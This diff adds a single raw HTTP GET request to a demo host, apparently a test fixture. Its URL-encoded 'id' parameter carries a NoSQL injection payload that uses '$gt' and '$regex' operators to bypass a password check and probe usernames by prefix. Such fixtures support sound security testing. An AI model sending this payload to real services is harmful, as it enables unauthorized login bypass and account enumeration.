@@ -1,0 +1,4 @@
+GET /a?id=%7B%22password%22%3A%7B%22%24gt%22%3A%22%22%7D%2C%22user%22%3A%7B%22%24regex%22%3A%22%5Ea%22%7D%7D HTTP/1.1
+Host: demo.example.com
+Connection: close
+
